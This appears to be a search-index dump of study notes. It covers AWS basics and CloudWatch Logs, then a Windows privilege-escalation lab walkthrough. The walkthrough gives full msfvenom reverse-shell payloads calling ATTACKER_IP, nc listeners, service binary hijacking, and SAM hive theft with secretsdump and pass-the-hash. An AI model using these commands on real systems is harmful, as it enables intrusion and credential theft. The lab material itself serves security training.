protection.</p>"},{"location":"notes/cloud/CloudBasics/#example-of-shared-responsibility-model","title":"Example of shared responsibility model:","text":"<p>Sanim stores a file to the Amazon S3 bucket. Sanim is hereby responsible for maintaining who can access, modify and revoke the file.Encryption of the data is also part of his job. The protection of file services like S3 bucket and databases falls under the AWS job.</p>"},{"location":"notes/cloud/CloudBasics/#aws-well-architected-framework","title":"AWS well architected framework.","text":"<p>After reviewing thousands of architectures, AWS developed the well architected framework which is used to build the most resilient, high performing, cost effective infrastructure on the cloud. The five pillars of the AWS well architected framework are :- 1. operational excellence 2. security 3. reliability 4. performance efficiency 5. cost optimization.</p> <p>Operational excellence: It is the ability  to run and monitor the system.Tasks include annotating documentation, making small reversible changes.</p> <p>Security: Ability to protect information, assets and systems</p> <p>Reliability: Ability to recover from disruptions, automatically recovering from failures, testing recovery procedures.</p> <p>performance efficiency: Ability to use computing resources efficiently. Experimenting more often, using serverless architectures and designing system to be global in minutes.</p> <p>Cost optimization: deliver services at the lowest possible cost.</p>"},{"location":"notes/cloud/CloudBasics/#costing-and-billing","title":"Costing and billing","text":"<p>Total cost of ownership (TCO) is the financial metric that is used to estimate and compare  direct and indirect costs of product or service. it includes: 1. Procurement 2. Management 3. Maintenance 4. Decommissioning of hardware resources</p>"},{"location":"notes/cloud/CloudBasics/#aws-pricing-models","title":"AWS Pricing models:","text":"<ol> <li>Pay as you go</li> <li>Save when you reserve</li> <li>Pay less by using more</li> </ol>"},{"location":"notes/cloud/CloudBasics/#aws-core-services","title":"AWS core services","text":""},{"location":"notes/cloud/CloudBasics/#aws-cloud9","title":"AWS cloud9","text":"<p>It is a cloud based IDE that helps to write code, debug  and run it on browser. It comes prepackaged with popular programming languages like JS, Python, PHP.</p> <p>Benefits of cloud9 1. code collaboratively : Instead of pushing to git and observer and test changes , the peers can work together in real time to write and check code. 2. Build serverless applications</p> <p>How cloud9 works  </p>"},{"location":"notes/cloud/CloudBasics/#vpc","title":"VPC","text":"<p>With Amazon Virtual Private Cloud (Amazon VPC), you can launch AWS resources in a logically isolated virtual network that you've defined. A VPC is a  secure isolated private cloud located within public cloud. </p> <p>Imagine a public cloud as a crowded restaurant, and a virtual private cloud as a reserved table in that crowded restaurant.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/","title":"CloudWatch Logs","text":""},{"location":"notes/cloud/CloudWatch%20Logs/#table-of-contents","title":"\ud83d\udcda Table of Contents","text":"<ol> <li>CloudWatch Logs - Overview</li> <li>Log Groups &amp; Log Streams</li> <li>CloudWatch Logs Destinations</li> <li>Encryption of Logs</li> <li>CloudWatch Logs Sources</li> <li>CloudWatch Logs Insights</li> <li>CloudWatch Logs S3 Export</li> <li>CloudWatch Logs Subscriptions</li> <li>CloudWatch Logs for EC2</li> <li>CloudWatch Logs Agent vs Unified Agent</li> <li>CloudWatch Unified Agent Metrics</li> </ol>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-overview","title":"CloudWatch Logs - Overview","text":"<p>Amazon CloudWatch Logs is a centralized log management service that allows you to monitor, store, and access log files from various AWS services, applications, and systems.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#key-concepts","title":"Key Concepts:","text":"<ul> <li>Log Groups: Named containers for log streams, typically representing an application or a component.</li> <li>Log Streams: Sequences of log events from the same source, such as an EC2 instance or container.</li> <li>Retention Policies: You can set logs to never expire or define a retention period (1 day to 10 years).</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#log-groups-log-streams","title":"Log Groups &amp; Log Streams","text":"<ul> <li>Log Group:</li> <li>A logical group representing an application or environment.</li> <li> <p>Example: <code>/aws/lambda/my-function</code>, <code>/ecs/app-logs</code>, etc.</p> </li> <li> <p>Log Stream:</p> </li> <li>A stream of logs coming from a particular instance, container, or log file.</li> <li>Example: A log stream from a specific EC2 instance in an Auto Scaling group.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-destinations","title":"CloudWatch Logs Destinations","text":"<p>CloudWatch Logs can stream or export logs to: - Amazon S3 (for batch exports) - Kinesis Data Streams (real-time log processing) - Kinesis Data Firehose (near real-time delivery to S3, Redshift, OpenSearch) - AWS Lambda (real-time processing/alerts) - OpenSearch (log analytics and search)</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#export-types","title":"Export Types:","text":"Destination Real-Time Use Case S3 \u274c Batch Archival, long-term storage Kinesis Streams \u2705 Custom stream processing Kinesis Firehose \u2705 Deliver to S3, Redshift, OpenSearch Lambda \u2705 Alerts, transformations OpenSearch \u2705 Log search, visualization"},{"location":"notes/cloud/CloudWatch%20Logs/#encryption-of-logs","title":"Encryption of Logs","text":"<ul> <li>By default, logs are encrypted at rest using CloudWatch service-managed encryption.</li> <li>Optional: Use KMS (Key Management Service) to encrypt logs with your own custom keys.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-sources","title":"CloudWatch Logs Sources","text":"<p>Logs can be sent from various AWS services and environments: - SDK / CloudWatch Logs Agent / Unified Agent - Elastic Beanstalk: Automatically collects application logs. - ECS (Elastic Container Service): Collects container logs. - Lambda: Automatically sends function logs to CloudWatch. - VPC Flow Logs: Captures traffic flow logs. - API Gateway: Request/response logs. - CloudTrail: Event history (when integrated via filters). - Route53: DNS query logs.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-insights","title":"CloudWatch Logs Insights","text":"<p>A query engine for searching and analyzing logs in CloudWatch.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#features","title":"Features:","text":"<ul> <li>Search for patterns or values (e.g., find specific IPs or count ERROR messages).</li> <li>Purpose-built query language.</li> <li>Auto-discovers fields in JSON logs.</li> <li>Supports filtering, aggregation, sorting, and field extraction.</li> <li>Queries can be saved and added to CloudWatch Dashboards.</li> <li>Supports multi-log group and cross-account queries.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#example-query","title":"Example Query:","text":"<pre><code>fields @timestamp, @message\n| filter @message like /ERROR/\n| sort @timestamp desc\n| limit 20\n</code></pre> <p>Note: Logs Insights is a query engine, not a real-time processor.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-s3-export","title":"CloudWatch Logs S3 Export","text":"<p>Exports logs to Amazon S3 in batch, not real-time.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#key-points","title":"Key Points:","text":"<ul> <li>Logs can take up to 12 hours to become available for export.</li> <li>Use <code>CreateExportTask</code> API to start an export job.</li> <li>Good for archiving, compliance, or offline analysis.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#limitations","title":"Limitations:","text":"<ul> <li>\u274c Not real-time</li> <li>\u2705 Use Log Subscriptions for live data streaming instead</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-subscriptions","title":"CloudWatch Logs Subscriptions","text":"<p>Used to stream logs in real-time or near real-time to other AWS services.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#destinations","title":"Destinations:","text":"<ul> <li>Lambda: Real-time processing</li> <li>Kinesis Data Streams: Advanced custom pipelines</li> <li>Kinesis Data Firehose: Delivery to S3, Redshift, OpenSearch</li> <li>OpenSearch: Direct search + visualization</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#subscription-filters","title":"Subscription Filters:","text":"<ul> <li>Define which logs to send, using filter patterns. <pre><code>ERROR\n\"GET /index.html\"\n{ $.statusCode = 500 }\n</code></pre></li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#cross-account-logging","title":"Cross-Account Logging:","text":"<ul> <li>CloudWatch logs from one account can be streamed to another using Kinesis with proper IAM permissions.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#multi-region-aggregation","title":"Multi-Region Aggregation:","text":"<ul> <li>Multiple log groups (from multiple regions or accounts) can stream logs to a centralized Firehose or OpenSearch setup for unified monitoring.</li> </ul>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-for-ec2","title":"CloudWatch Logs for EC2","text":"<p>By default, EC2 instances do not send any logs to CloudWatch.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#to-enable-logging","title":"To enable logging:","text":"<ol> <li>Install the CloudWatch Agent.</li> <li>Configure which logs to push.</li> <li>Attach an IAM Role with permissions to send logs.</li> <li>Agent pushes log data to specified log group/stream.</li> </ol> <p>Also works for on-premises servers, enabling hybrid cloud monitoring.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-logs-agent-vs-unified-agent","title":"CloudWatch Logs Agent vs Unified Agent","text":"Feature CloudWatch Logs Agent CloudWatch Unified Agent Logs \u2705 \u2705 Custom Metrics \u274c \u2705 Legacy \u2705 \u274c Centralized Config (SSM) \u274c \u2705 Flexibility Low High <p>Recommendation: Use Unified Agent for all new setups.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#cloudwatch-unified-agent-metrics","title":"CloudWatch Unified Agent Metrics","text":"<p>The Unified Agent can collect detailed system metrics directly from your EC2 or on-prem server.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#categories-metrics","title":"Categories &amp; Metrics:","text":"<ul> <li>CPU: user, system, idle, steal, guest</li> <li>Disk: used, free, total space; read/write rates, IOPS</li> <li>RAM: total, used, free, inactive, cached</li> <li>Network: TCP/UDP connections, packets, bytes</li> <li>Processes: total, running, blocked, sleeping</li> <li>Swap: total, used, free, percent used</li> </ul> <p>These go beyond default EC2 metrics, giving much deeper insight into system performance.</p>"},{"location":"notes/cloud/CloudWatch%20Logs/#summary","title":"\u2705 Summary","text":"<ul> <li>CloudWatch Logs centralizes logging from AWS and non-AWS sources.</li> <li>You can analyze logs with Logs Insights, export them to S3, or stream them in real time.</li> <li>Use the Unified Agent for advanced metrics and log collection.</li> <li>Build cross-account, multi-region logging architectures using subscriptions.</li> </ul>"},{"location":"notes/privilegeescalation/Abusing%20service%20misconfigurations/","title":"Abusing service misconfigurations","text":""},{"location":"notes/privilegeescalation/Abusing%20service%20misconfigurations/#windows-services","title":"Windows Services","text":"<p>Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.</p> <p>Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.</p> <p>To better understand the structure of a service, let's check the apphostsvc service configuration with the <code>sc qc</code> command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc qc apphostsvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: apphostsvc\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k apphost\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Application Host Helper Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : localSystem\n</code></pre> <p>Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.</p> <p>Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):</p> <p> </p> <p>All of the services configurations are stored on the registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\</code>:</p> <p> </p> <p>A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.</p>"},{"location":"notes/privilegeescalation/Abusing%20service%20misconfigurations/#insecure-permissions-on-service-executable","title":"Insecure Permissions on Service Executable","text":"<p>If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.</p> <p>To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using <code>sc</code>:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc qc WindowsScheduler\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: windowsscheduler\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\PROGRA~2\\SYSTEM~1\\WService.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : System Scheduler Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : .\\svcuser1\n</code></pre> <p>We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in <code>C:\\Progra~2\\System~1\\WService.exe</code>. We then proceed to check the permissions on the executable:</p> <p>Command Prompt</p> <pre><code>C:\\Users\\thm-unpriv&gt;icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe\nC:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)\n                                  NT AUTHORITY\\SYSTEM:(I)(F)\n                                  BUILTIN\\Administrators:(I)(F)\n                                  BUILTIN\\Users:(I)(RX)\n                                  APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                                  APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.</p> <p>Let's generate an exe-service payload using msfvenom and serve it through a python webserver:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe\n\nuser@attackerpc$ python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>We can then pull the payload from Powershell with the following command:</p> <p>Powershell</p> <pre><code>wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe\n</code></pre> <p>Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; cd C:\\PROGRA~2\\SYSTEM~1\\\n\nC:\\PROGRA~2\\SYSTEM~1&gt; move WService.exe WService.exe.bkp\n        1 file(s) moved.\n\nC:\\PROGRA~2\\SYSTEM~1&gt; move C:\\Users\\thm-unpriv\\rev-svc.exe WService.exe\n        1 file(s) moved.\n\nC:\\PROGRA~2\\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F\n        Successfully processed 1 files.\n</code></pre> <p>We start a reverse listener on our attacker machine:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4445\n</code></pre> <p>And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc stop windowsscheduler\nC:\\&gt; sc start windowsscheduler\n</code></pre> <p>Note:\u00a0PowerShell has <code>sc</code> as an alias to <code>Set-Content</code>, therefore you need to use <code>sc.exe</code> in order to control services with PowerShell this way.</p> <p>As a result, you'll get a reverse shell with svcusr1 privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4445\nListening on 0.0.0.0 4445\nConnection received on 10.10.175.90 50649\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwprivesc1\\svcusr1\n</code></pre> <p>Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>"},{"location":"notes/privilegeescalation/Abusing%20service%20misconfigurations/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<p>When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.</p> <p>When working with Windows services, a very particular behaviour occurs when the service is configured to point to an \"unquoted\" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.</p> <p>As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by <code>\"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\"</code>, followed by the given parameters:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc qc \"vncserver\"\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: vncserver\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : VNC Server\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n</code></pre> <p>Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt. Now let's look at another service without proper quotation:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc qc \"disk sorter enterprise\"\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: disk sorter enterprise\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Disk Sorter Enterprise\n        DEPENDENCIES       :\n        SERVICE_START_NAME : .\\svcusr2\n</code></pre> <p>When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the \"Disk Sorter Enterprise\" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:</p> Command Argument 1 Argument 2 C:\\MyPrograms\\Disk.exe Sorter Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter.exe Enterprise\\bin\\disksrs.exe C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe <p>This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the \"right\" interpretation of the unquoted command would be to execute <code>C:\\\\MyPrograms\\\\Disk.exe</code> and take the rest as arguments.</p> <p>Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:</p> <ol> <li>First, search for <code>C:\\\\MyPrograms\\\\Disk.exe</code>. If it exists, the service will run this executable.</li> <li>If the latter doesn't exist, it will then search for <code>C:\\\\MyPrograms\\\\Disk Sorter.exe</code>. If it exists, the service will run this executable.</li> <li>If the latter doesn't exist, it will then search for <code>C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.</li> </ol> <p>From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.</p> <p>While this sounds trivial, most of the service executables will be installed under <code>C:\\Program Files</code> or <code>C:\\Program Files (x86)</code> by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.</p> <p>In our case, the Administrator installed the Disk Sorter binaries under <code>c:\\MyPrograms</code>. By default, this inherits the permissions of the <code>C:\\</code> directory, which allows any user to create files and folders in it. We can check this using <code>icacls</code>:</p> <p>Command Prompt</p> <pre><code>C:\\&gt;icacls c:\\MyPrograms\nc:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n              BUILTIN\\Administrators:(I)(OI)(CI)(F)\n              BUILTIN\\Users:(I)(OI)(CI)(RX)\n              BUILTIN\\Users:(I)(CI)(AD)\n              BUILTIN\\Users:(I)(CI)(WD)\n              CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>The <code>BUILTIN\\\\Users</code> group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.</p> <p>The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe\n\nuser@attackerpc$ nc -lvp 4446\n</code></pre> <p>Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to <code>C:\\MyPrograms\\Disk.exe</code>. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; move C:\\Users\\thm-unpriv\\rev-svc2.exe C:\\MyPrograms\\Disk.exe\n\nC:\\&gt; icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F\n        Successfully processed 1 files.\n</code></pre> <p>Once the service gets restarted, your payload should execute:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc stop \"disk sorter enterprise\"\nC:\\&gt; sc start \"disk sorter enterprise\"\n</code></pre> <p>As a result, you'll get a reverse shell with svcusr2 privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4446\nListening on 0.0.0.0 4446\nConnection received on 10.10.175.90 50650\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwprivesc1\\svcusr2\n</code></pre> <p>Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>"},{"location":"notes/privilegeescalation/Abusing%20service%20misconfigurations/#insecure-service-permissions","title":"Insecure Service Permissions","text":"<p>You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.</p> <p>To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at <code>C:\\\\tools</code>. The command to check for the thmservice service DACL is:</p> <p>Command Prompt</p> <pre><code>C:\\tools\\AccessChk&gt; accesschk64.exe -qlc thmservice\n  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM\n        SERVICE_QUERY_STATUS\n        SERVICE_QUERY_CONFIG\n        SERVICE_INTERROGATE\n        SERVICE_ENUMERATE_DEPENDENTS\n        SERVICE_PAUSE_CONTINUE\n        SERVICE_START\n        SERVICE_STOP\n        SERVICE_USER_DEFINED_CONTROL\n        READ_CONTROL\n  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users\n        SERVICE_ALL_ACCESS\n</code></pre> <p>Here we can see that the <code>BUILTIN\\\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.</p> <p>Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe\n\nuser@attackerpc$ nc -lvp 4447\n</code></pre> <p>We will then transfer the reverse shell executable to the target machine and store it in <code>C:\\Users\\thm-unpriv\\rev-svc3.exe</code>. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F\n</code></pre> <p>To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem\n</code></pre> <p>Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; sc stop THMService\nC:\\&gt; sc start THMService\n</code></pre> <p>And we will receive a shell back in our attacker's machine with SYSTEM privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4447\nListening on 0.0.0.0 4447\nConnection received on 10.10.175.90 50650\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nNT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"notes/privilegeescalation/Abusing_dangerous_privileges/","title":"Abusing dangerous privileges","text":""},{"location":"notes/privilegeescalation/Abusing_dangerous_privileges/#windows-privileges","title":"Windows Privileges","text":"<p>Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.</p> <p>Each user has a set of assigned privileges that can be checked with the following command:</p> <pre><code>whoami /priv\n</code></pre> <p>A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.</p> <p>While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.</p>"},{"location":"notes/privilegeescalation/Abusing_dangerous_privileges/#sebackup-serestore","title":"SeBackup / SeRestore","text":"<p>The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p> <p>Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.</p> <p>This account is part of the \"Backup Operators\" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the \"Open as administrator\" option to use these privileges. We will be asked to input our password again to get an elevated console:</p> <p> </p> <p>Once on the command prompt, we can check our privileges with the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <p>To backup the SAM and SYSTEM hashes, we can use the following commands:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; reg save hklm\\system C:\\Users\\THMBackup\\system.hive\nThe operation completed successfully.\n\nC:\\&gt; reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive\nThe operation completed successfully.\n</code></pre> <p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's <code>smbserver.py</code> to start a simple SMB server with a network share in the current directory of our AttackBox:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ mkdir share\nuser@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share\n</code></pre> <p>This will create a share named <code>public</code> pointing to the <code>share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code>copy</code> command in our windows machine to transfer both files to our AttackBox:\u00a0</p> <p>Command Prompt</p> <pre><code>C:\\&gt; copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\\nC:\\&gt; copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\\n</code></pre> <p>And use impacket to retrieve the users' password hashes:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre> <p>We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.173.241\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.175.90.....\n[*] Found writable share ADMIN$\n[*] Uploading file nfhtabqO.exe\n[*] Opening SVCManager on 10.10.175.90.....\n[*] Creating service RoLE on 10.10.175.90.....\n[*] Starting service RoLE.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>"},{"location":"notes/privilegeescalation/Abusing_dangerous_privileges/#setakeownership","title":"SeTakeOwnership","text":"<p>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.</p> <p>To get the SeTakeOwnership privilege, we need to open a command prompt using the \"Open as administrator\" option. We will be asked to input our password to get an elevated console:</p> <p> </p> <p>Once on the command prompt, we can check our privileges with the following command:</p> <p>Command Prompt</p> 